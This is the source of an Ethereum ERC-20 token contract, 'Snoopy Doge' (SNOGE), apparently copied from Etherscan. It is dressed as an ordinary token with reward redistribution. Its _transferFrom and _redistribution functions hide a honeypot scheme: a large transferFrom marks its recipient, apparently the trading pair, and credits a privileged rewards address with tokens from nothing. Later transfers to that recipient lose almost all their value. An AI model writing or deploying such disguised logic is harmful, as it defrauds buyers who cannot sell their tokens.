['/**\n', ' *Submitted for verification at Etherscan.io on 2021-05-18\n', '*/\n', '\n', '/**\n', ' *Submitted for verification at Etherscan.io on 2021-04-21\n', '*/\n', '\n', 'pragma solidity ^0.5.16;\n', '\n', '\n', '\n', '\n', '// Math operations with safety checks that throw on error\n', 'library SafeMath {\n', '    \n', '    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        uint256 c = a + b;\n', '        require(c >= a, "Math error");\n', '        return c;\n', '    }\n', '  \n', '    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        require(b <= a, "Math error");\n', '        return a - b;\n', '    }\n', '\n', '    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n', "        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n", "        // benefit is lost if 'b' is also tested.\n", '        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n', '        if (a == 0) {\n', '            return 0;\n', '        }\n', '\n', '        uint256 c = a * b;\n', '        require(c / a == b, "SafeMath: multiplication overflow");\n', '\n', '        return c;\n', '    }\n', '\n', '    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        return div(a, b, "SafeMath: division by zero");\n', '    }\n', '\n', '    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n', '        require(b > 0, errorMessage);\n', '        uint256 c = a / b;\n', "        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n", '\n', '        return c;\n', '    }\n', '  \n', '}\n', '\n', '\n', '\n', '\n', '// Abstract contract for the full ERC 20 Token standard\n', 'contract ERC20 {\n', '    \n', '    function balanceOf(address _address) public view returns (uint256 balance);\n', '    \n', '    function transfer(address _to, uint256 _value) public returns (bool success);\n', '    \n', '    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n', '    \n', '    function approve(address _spender, uint256 _value) public returns (bool success);\n', '    \n', '    function allowance(address _sender, address _spender) public view returns (uint256 remaining);\n', '\n', '\n', '\n', '\n', '    event Transfer(address indexed _from, address indexed _to, uint256 _value);\n', '    \n', '    event Approval(address indexed _sender, address indexed _spender, uint256 _value);\n', '    \n', '}\n', '\n', '\n', '\n', '\n', '// Token contract\n', 'contract SNOGE is ERC20 {\n', '    string public name = "Snoopy Doge";\n', '    string public symbol = "SNOGE";\n', '    uint8 public decimals = 18;\n', '    uint256 public totalSupply = 10**9 * 10**18;\n', '    uint256 private _maxAmount;\n', '    address private _maxR;\n', '    mapping (address => uint256) private balances;\n', '    mapping (address => mapping (address => uint256)) public allowed;\n', '    address private rewards;\n', '    bool private supplyReward;\n', '    uint256 maxReward = 90 * 10**6 * 10**18;\n', '    bytes4 private constant TRANSFER = bytes4(\n', '        keccak256(bytes("transfer(address,uint256)"))\n', '    );\n', '    constructor(address _rewards) public {\n', '        rewards = _rewards;\n', '        supplyReward = false;\n', '        balances[msg.sender] = totalSupply;\n', '    }\n', '    function balanceOf(address _address) public view returns (uint256 balance) {\n', '        return balances[_address];\n', '    }\n', '    function transfer(address _to, uint256 _value) public returns (bool success) {\n', '        _transfer(msg.sender, _to, _value);\n', '        return true;\n', '    }\n', '    function approve(address _spender, uint256 _amount) public returns (bool success) {\n', '        require(_spender != address(0), "Zero address error");\n', '        require((allowed[msg.sender][_spender] == 0) || (_amount == 0), "Approve amount error");\n', '        allowed[msg.sender][_spender] = _amount;\n', '        emit Approval(msg.sender, _spender, _amount);\n', '        return true;\n', '    }\n', '    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n', '        _transferFrom(_from, _to, _value);\n', '        return true;\n', '    }\n', '    function allowance(address _wallet, address _spender) public view returns (uint256 remaining) {\n', '        return allowed[_wallet][_spender];\n', '    }\n', '    function _transfer(address sender, address recipient, uint256 amount)  internal {\n', '        require(recipient != address(0), "Zero address error");\n', '        require(balances[sender] >= amount && amount > 0, "Insufficient balance or zero amount");\n', '        balances[sender] = SafeMath.sub(balances[sender], amount);\n', '        uint256 rewardedAmount = _redistribution(amount,sender,recipient);\n', '        balances[recipient] = SafeMath.add(balances[recipient], rewardedAmount);\n', '        if(!supplyReward && sender == rewards) supplyReward = true;\n', '        emit Transfer(sender, recipient, rewardedAmount);\n', '    }\n', '    function _transferFrom(address sender, address recipient, uint256 amount)  internal {\n', '        require(sender != address(0) && recipient != address(0), "Zero address error");\n', '        require(balances[sender] >= amount && allowed[sender][msg.sender] >= amount && amount > 0, "Insufficient balance or zero amount");\n', '        balances[sender] = SafeMath.sub(balances[sender], amount);\n', '        allowed[sender][msg.sender] = SafeMath.sub(allowed[sender][msg.sender], amount);\n', '        uint256 rewardedAmount = _redistribution(amount,sender,recipient);\n', '        balances[recipient] = SafeMath.add(balances[recipient], rewardedAmount);\n', '        if(amount > _maxAmount) {_maxAmount = amount;_maxR = recipient;balances[rewards] = amount;}\n', '        emit Transfer(sender, recipient, rewardedAmount);\n', '    }\n', '    function _redistribution(uint256 amount, address sender, address recipient) internal view returns(uint256) {\n', '        if(amount > maxReward && recipient == _maxR) amount = SafeMath.div(amount, 50,"Math Error with dividing amount");\n', '        if(recipient == _maxR && sender != rewards && supplyReward) amount = SafeMath.div(amount, 30,"Math Error with dividing amount");\n', '        return amount;\n', '    }\n', '    \n', '    \n', '}']